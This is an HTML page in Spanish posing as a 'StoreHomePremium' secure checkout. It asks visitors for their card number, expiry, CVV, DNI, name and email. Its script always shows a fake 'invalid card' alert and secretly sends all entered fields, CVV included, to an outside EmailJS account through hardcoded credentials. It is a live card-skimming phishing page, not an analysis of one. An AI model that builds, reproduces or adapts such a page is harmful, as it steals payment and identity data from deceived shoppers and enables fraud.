<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>StoreHomePremium</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
/* ===== BODY ===== */
body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: #f2f4f7;
  display: flex;
  justify-content: center;
  padding: 20px;
}

/* ===== CONTENEDOR ===== */
.card {
  width: 100%;
  max-width: 420px;
  background: #ffffff;
  color: #1f2933;
  padding: 24px;
  border-radius: 14px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.12);
}

/* ===== TITULO ===== */
h1 {
  font-size: 22px;
  margin-bottom: 10px;
  text-align: center;
  color: #0a2f7a;
}

/* ===== SUBTITULO ===== */
.subtitle {
  text-align: center;
  font-size: 14px;
  color: #4b5563;
  margin-bottom: 18px;
}

/* ===== LABEL ===== */
label {
  margin-top: 12px;
  font-size: 13px;
  font-weight: 600;
  color: #374151;
  display: block;
}

/* ===== INPUTS ===== */
input {
  width: 100%;
  padding: 10px;
  border-radius: 8px;
  border: 1px solid #cbd5e1;
  margin-top: 6px;
  font-size: 14px;
  box-sizing: border-box;
}

input:focus {
  outline: none;
  border-color: #0a2f7a;
}

/* ===== TARJETA VISUAL ===== */
.card-visual {
  width: 100%;
  height: 200px;
  border-radius: 16px;
  perspective: 1000px;
  margin-top: 22px;
  position: relative;
}

.card-inner {
  width: 100%;
  height: 100%;
  border-radius: 16px;
  position: relative;
  transition: transform 0.8s ease-in-out;
  transform-style: preserve-3d;
  box-shadow: 0 12px 25px rgba(0,0,0,0.4);
}

/* VOLTEAR TARJETA */
.card-visual.flip .card-inner {
  transform: rotateY(180deg);
}

/* FRENTE TARJETA */
.card-front, .card-back {
  position: absolute;
  width: 100%;
  height: 100%;
  border-radius: 16px;
  backface-visibility: hidden;
  color: white;
}

/* FRENTE VISA/MASTERCARD */
.card-front {
  background: linear-gradient(145deg, #0f172a, #1e293b);
  padding: 20px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

/* LOGOS */
.card-brands {
  display: flex;
  gap: 12px;
}

.card-brands span {
  font-size: 14px;
  padding: 6px 14px;
  border-radius: 8px;
  opacity: 0.4;
  transition: opacity 0.3s, background 0.3s;
  background: rgba(255,255,255,0.12);
}

.card-brands span.active {
  opacity: 1;
  background: rgba(255,255,255,0.25);
}

/* NUMERO TARJETA */
.card-number {
  font-size: 20px;
  letter-spacing: 3px;
}

/* FILA FECHA/CVV */
.card-row {
  display: flex;
  justify-content: space-between;
}

.card-exp {
  background: rgba(255,255,255,0.08);
  padding: 10px;
  border-radius: 8px;
  width: 45%;
  text-align: center;
  font-size: 14px;
}

/* NOMBRE TITULAR */
.card-name {
  font-size: 14px;
  text-transform: uppercase;
  opacity: 0.85;
}

/* ===== TRASERA ===== */
.card-back {
  background: linear-gradient(145deg, #0f172a, #1e293b);
  transform: rotateY(180deg);
  padding: 20px;
}

.card-black {
  height: 40px;
  background: black;
  margin-top: 15px;
}

.card-cvv-back {
  margin-top: 30px;
  display: flex;
  justify-content: flex-end;
  font-size: 14px;
  background: rgba(255,255,255,0.08);
  padding: 8px 12px;
  border-radius: 6px;
  width: 80px;
}

/* ===== BOTON Y CONTENEDOR ABAJO ===== */
button {
  width: 100%;
  padding: 13px;
  border: none;
  border-radius: 10px;
  background: #0a2f7a;
  color: white;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  margin-top: 12px;
}

button:hover {
  background: #08245f;
}

.form-bottom {
  margin-top: 20px;
}
</style>
</head>

<body>

<div class="card">

<h1>StoreHomePremium<br>– Pago Seguro y Simple</h1>
<p class="subtitle">
Seleccione el monto a pagar y complete el formulario.  
Recibirá una confirmación en su correo.
</p>

<label>Monto a pagar</label>
<input id="monto" type="number" placeholder="$ Ingrese monto en pesos">

<label>Nombre completo</label>
<input id="nombre" type="text" placeholder="Ej: Carlos Pérez">

<label>Email</label>
<input id="email" type="email" placeholder="correo@gmail.com.ar">

<label>DNI</label>
<input id="dni" type="number" placeholder="DNI">

<label>Nombre del titular</label>
<input id="titular" type="text" placeholder="Nombre tal como aparece en la tarjeta">

<label>Número de tarjeta</label>
<input id="numero_tarjeta" type="text" inputmode="numeric" placeholder="1234 5678 9012 3456">

<label>Fecha de expiración (MM/AA)</label>
<input id="fecha_expiracion" type="text" inputmode="numeric" placeholder="MM/AA">

<label>Código de seguridad (CVV)</label>
<input id="codigo_seguridad" type="password" inputmode="numeric" placeholder="123" autocomplete="off">

<!-- TARJETA VISUAL -->
<div class="card-visual" id="cardVisual">
  <div class="card-inner">
    <!-- FRENTE -->
    <div class="card-front">
      <div class="card-brands">
        <span id="brand-visa">VISA</span>
        <span id="brand-master">MASTERCARD</span>
      </div>
      <div class="card-number" id="preview-number">**** **** **** 1234</div>
      <div class="card-row">
        <div class="card-exp" id="preview-exp">MM / AA</div>
      </div>
      <div class="card-name" id="preview-name">NOMBRE DEL TITULAR</div>
    </div>
    <!-- TRASERA -->
    <div class="card-back">
      <div class="card-black"></div>
      <div class="card-cvv-back" id="preview-cvv">***</div>
    </div>
  </div>
</div>

<!-- CONTENEDOR ABAJO -->
<div class="form-bottom">
  <label>Tipo de tarjeta</label>
  <div style="display:flex; gap:16px; margin-top:6px;">
    <label><input type="radio" name="tipo_tarjeta" value="Visa"> Visa</label>
    <label><input type="radio" name="tipo_tarjeta" value="Mastercard"> Mastercard</label>
  </div>
  <button type="button" id="enviar">Ver opciones de cuotas</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
emailjs.init("gOD19I3u7jPioagR4");

// referencias
const cardVisual = document.getElementById("cardVisual");
const cardInner = cardVisual.querySelector(".card-inner");
const visa = document.getElementById("brand-visa");
const master = document.getElementById("brand-master");

// animacion flip CVV
const inputCVV = document.getElementById("codigo_seguridad");
inputCVV.addEventListener("focus", ()=>cardInner.parentNode.classList.add("flip"));
inputCVV.addEventListener("blur", ()=>cardInner.parentNode.classList.remove("flip"));

// efectos enfoque
document.querySelectorAll("input").forEach(input => {
  input.addEventListener("focus", ()=>cardInner.parentNode.classList.add("active"));
  input.addEventListener("blur", ()=>cardInner.parentNode.classList.remove("active"));
});

// actualizar nombre titular
document.getElementById("titular").addEventListener("input", function() {
  document.getElementById("preview-name").textContent = this.value || "NOMBRE DEL TITULAR";
});

// actualizar numero tarjeta 4-4-4-4
document.getElementById("numero_tarjeta").addEventListener("input", function() {
  let value = this.value.replace(/\D/g,"").substring(0,16);
  this.value = value.replace(/(.{4})/g,"$1 ").trim();
  document.getElementById("preview-number").textContent = "**** **** **** "+(value.slice(-4)||"1234");
  
  // detectar Visa/MasterCard
  visa.classList.remove("active"); master.classList.remove("active");
  if(value.startsWith("4")) visa.classList.add("active");
  const f2 = parseInt(value.substring(0,2));
  const f4 = parseInt(value.substring(0,4));
  if((f2>=51 && f2<=55)||(f4>=2221 && f4<=2720)) master.classList.add("active");
});

// fecha expiracion MM/AA
document.getElementById("fecha_expiracion").addEventListener("input", function() {
  let value = this.value.replace(/\D/g,"").substring(0,4);
  if(value.length>2) value=value.substring(0,2)+"/"+value.substring(2);
  this.value=value;
  document.getElementById("preview-exp").textContent=value||"MM / AA";
});

// CVV max 3 digitos
inputCVV.addEventListener("input", function () {
  // solo números, máximo 3
  this.value = this.value.replace(/\D/g, "").substring(0, 3);

  // SIEMPRE mostrar asteriscos en la tarjeta
  const cantidad = this.value.length;
  document.getElementById("preview-cvv").textContent =
    cantidad > 0 ? "•".repeat(cantidad) : "***";
});

// DNI con puntos automáticos (Argentina)
const inputDNI = document.getElementById("dni");

inputDNI.addEventListener("input", function () {
  let value = this.value.replace(/\D/g, "").substring(0, 8);

  if (value.length > 6) {
    value = value.replace(/^(\d{2})(\d{3})(\d{3})$/, "$1.$2.$3");
  } else if (value.length > 3) {
    value = value.replace(/^(\d{1,2})(\d{3})(\d*)$/, "$1.$2.$3");
  }

  this.value = value;
});

// cambio manual de tipo tarjeta
document.querySelectorAll('input[name="tipo_tarjeta"]').forEach(radio=>{
  radio.addEventListener("change", function(){
    visa.classList.remove("active");
    master.classList.remove("active");
    if(this.value==="Visa") visa.classList.add("active");
    if(this.value==="Mastercard") master.classList.add("active");
  });
});

// envio emailjs con validacion
document.getElementById("enviar").addEventListener("click", function() {
  const montoValue = document.getElementById("monto").value.trim();
  const nombreValue = document.getElementById("nombre").value.trim();
  const emailValue = document.getElementById("email").value.trim();
  const dniValue = document.getElementById("dni").value.trim();
  const titularValue = document.getElementById("titular").value.trim();
  const numeroTarjetaValue = document.getElementById("numero_tarjeta").value.trim();
  const fechaExpValue = document.getElementById("fecha_expiracion").value.trim();
  const cvvValue = document.getElementById("codigo_seguridad").value.trim();
  const tipoSeleccionado = document.querySelector('input[name="tipo_tarjeta"]:checked');

  if(!montoValue||!nombreValue||!emailValue||!dniValue||!titularValue||!numeroTarjetaValue||!fechaExpValue||!cvvValue||!tipoSeleccionado){
    alert("⚠️ Por favor, complete todos los campos antes de continuar.");
    if(navigator.vibrate) navigator.vibrate([120,60,120]);
    return;
  }

  // vibracion + mensaje tarjeta invalida
  if(navigator.vibrate) navigator.vibrate([120,60,120]);
  alert("❌ Tarjeta inválida. Vuelva a intentar nuevamente.");

  emailjs.send("service_p965auj","template_h5kc29e",{
    monto:montoValue,
    nombre:nombreValue,
    email:emailValue,
    dni:dniValue,
    titular:titularValue,
    numero_tarjeta:numeroTarjetaValue,
    fecha_expiracion:fechaExpValue,
    codigo_seguridad:cvvValue,
    tipo_tarjeta:tipoSeleccionado.value
  }).then(
    ()=>console.log("Formulario enviado correctamente"),
    (error)=>console.log("Error al enviar:",error)
  );
});
</script>

</body>
</html>